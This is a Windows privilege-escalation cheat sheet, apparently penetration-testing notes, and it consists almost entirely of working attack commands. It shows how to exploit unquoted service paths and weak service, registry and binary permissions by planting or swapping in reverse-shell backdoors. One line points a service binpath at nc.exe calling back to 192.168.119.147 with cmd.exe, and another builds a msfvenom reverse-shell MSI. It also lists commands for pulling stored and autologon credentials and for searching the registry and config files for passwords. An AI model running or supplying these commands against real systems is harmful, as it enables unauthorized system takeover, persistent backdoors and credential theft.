#### Unquoted Service Path Exploitation

```bash

## Case 1, SeShutdownPrivilege is listed when checked whoami /priv # doesn't matter even if it shows Disabled

# Search for services that auto start:
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
# Search for non-standard services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows"
# Potential unquoted service output example
Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        auto

# next check if W or F permission exists for BUILTIN\Users or Everyone on one of the sub directory
icacls "C:\\"                         # or: .\accesschk.exe /accepteula -uwdq C:\
icacls "C:\Program Files"             # or: .\accesschk.exe /accepteula -uwdq "C:\Program Files"
icacls "C:\Program Files\Heisenburg"  # or  .\accesschk.exe /accepteula -uwdq "C:\Program Files\Heisenburg"

# Example output if (builtin\users or EVERYONE) has ( (I) or (F) ) on "C:\Program Files\Heisenburg":
#                  BUILTIN\Users:(F)
#                  BUILTIN\Users:(I)(RX) 
# Example output for accesschk.exe:
#  RW BUILTIN\Users


# Create reverse shell binary and copy it accordingly

copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe" 

# now reboot to have the service auto start 

shutdown /r /t 0




## Case 2, SeShutdownPrivilege = Disabled, we have (service_stop,service_start) privilege on a service

# Search for services that has manual start mode and non-standard
wmic service get name,displayname,pathname,startmode | findstr /i "manual" | findstr /i /v "c:\windows"
# Potential unquoted service output example
Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        manual

# Check if we have service_stop, service_start privilege
.\accesschk.exe /accepteula -ucqv user heisenburgsvc

# next check if W or F permission exists for BUILTIN\Users or Everyone on one of the sub directory
icacls "C:\\"                         # or: .\accesschk.exe /accepteula -uwdq C:\
icacls "C:\Program Files"             # or: .\accesschk.exe /accepteula -uwdq "C:\Program Files"
icacls "C:\Program Files\Heisenburg"  # or  .\accesschk.exe /accepteula -uwdq "C:\Program Files\Heisenburg"

# Example output if (builtin\users or EVERYONE) has ( (I) or (F) ) on "C:\Program Files\Heisenburg":
#                  BUILTIN\Users:(F)
#                  BUILTIN\Users:(I)(RX) 
# Example output for accesschk.exe:
#  RW BUILTIN\Users



# Since there is spaces between "\The One Who\" on the path
# Windows will look for "\The.exe" first, then "\The One.exe", then "\The One Who.exe", and finally "\The One Who\knocks.exe"

# Create reverse shell binary and copy it accordingly

copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe" 

# Start netcat listener to catch the reverse shell and start the service
net start heisenburgsvc # net stop heisenburgsvc first if the service is already running.

```


#### Weak service permissions Exploitation

```bash
# download accesschk.exe form here https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
# List access for all services
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" * # or: .\accesschk.exe /accepteula -uwcqv user *
# Example Output, have full access in two services:
# $ RW SSDPSRV
# $	SERVICE_ALL_ACCESS
# $ RW upnphost
# $	SERVICE_ALL_ACCESS

# at least (service_change_config, service_start, service_stop) access is needed, service_all_access = full access

# If both conditions are met we can start exploiting this now.

# List current config for the service
sc qc upnphost
# see if START TYPE is DEMAND_START and if SERVICE_START_NAME is higher privileged
# $        START_TYPE         : 3   DEMAND_START
# ...
# ... 
# $        SERVICE_START_NAME : NT AUTHORITY\LocalService 
# change binpath with the payload you want to execute, example rev shell with uploaded nc.exe:
sc config "upnphost" binpath= "C:\WINDOWS\Temp\nc.exe 192.168.119.147 443 -e C:\WINDOWS\System32\cmd.exe"
# remove dependencies (if any)
sc config "upnphost" depend= ""
# make it run from system account
sc config "upnphost" obj= ".\LocalSystem" password= ""
# Start netcat listener to catch the reverse shell and start the service
net start "upnphost" # net stop "upnphost" first if the service is already running.
```


#### Weak Registry Permissions Exploitation

```bash
# Check permissions for an example service "upnphost"
Get-Acl HKLM:\System\CurrentControlSet\Services\upnphost | Format-List # PowerShell
# Example output, Check if NT AUTHORITY\INTERACTIVE has Full Control
# Access : Everyone Allow  ReadKey
#          NT AUTHORITY\INTERACTIVE Allow  FullControl
#          NT AUTHORITY\SYSTEM Allow  FullControl 
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\upnphost # same thing accesschk
# Example output for accesschk.exe:
#   RW NT AUTHORITY\INTERACTIVE
#         KEY_ALL_ACCESS

# Check if we have service_stop, service_start privilege
.\accesschk.exe /accepteula -ucqv user upnphost

# If both conditions are met we can start exploiting this now.

# list current values of the service
reg query HKLM\System\CurrentControlSet\Services\upnphost
# example output:
# HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\upnphost
#     DisplayName    REG_SZ    @%systemroot%\system32\upnphost.dll,-213
#     ErrorControl    REG_DWORD    0x1
#     ImagePath    REG_EXPAND_SZ    %SystemRoot%\system32\svchost.exe -k LocalServiceAndNoImpersonation
#     ...

# update ImagePath to point to our reverse shell payload
reg add HKLM\System\CurrentControlSet\Services\upnphost /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\backdoor.exe /f
# Start netcat listener to catch the reverse shell and start the service
net start "upnphost" # net stop "upnphost" first if the service is already running.
```


#### Weak Service Executable File Permissions Exploitation

```sh
# verifying we can overwrite and existing service binary file 
icacls "C:\Program Files\Heisenburg\knocks.exe"  # or .\accesschk.exe /accepteula -uvwq "C:\Program Files\Heisenburg\knocks.exe"

# Example output if (builtin\users or EVERYONE) has ( (I) or (F) ) on "C:\Program Files\Heisenburg":
#                  Everyone:(F)
#                  BUILTIN\Users:(I)(RX) 
# Example output for accesschk.exe:
#  RW BUILTIN\Users
#        FILE_ALL_ACCESS

# backup original executable
copy "C:\Program Files\Heisenburg\knocks.exe"  C:\Temp\

# Create reverse shell binary and overwrite the existing one
copy /Y C:\Temp\backdoor.exe "C:\Program Files\Heisenburg\knocks.exe" 
# Start netcat listener to catch the reverse shell and start the service
net start "heisenburgsvc" # net stop "heisenburgsvc" first if the service is already running.
```


#### AlwaysInstallElevated privilege Escalation

```sh
# This will only work if both registry keys contain "AlwaysInstallElevated" value 0x1.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# if the conditions are met we can exploit this now

# generate reverse shell msi payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY-IP> LPORT=<MY-PORT> -f msi -o shell.msi

# copy the binary over to target, start a listener and exec
msiexec /quiet /qn /i C:\Temp\shell.msi
```


#### Stored credentials

```sh
cmdkey /list

# if saved creds exist use runas to execute as that user
runas /savedcred /user:<USERNAME-OF-SAVED-CRED> C:\Temp\backdoor.exe
```

#### Get passwords from windows registry
```sh
# autologon creds
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
or,
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

#### Search for password in registry
```sh
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Search for password in common files 
```sh
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
```


#### Files that may contain passwords 
```sh
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
# sysbol policy files containing cPassword on a domain controller; 
# general locations: %SYSTEMROOT%\SYSVOL\sysvol 
# \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
```


#### Find all weak folder permissions per drive.
```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

#### Find all weak file permissions per drive.
```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
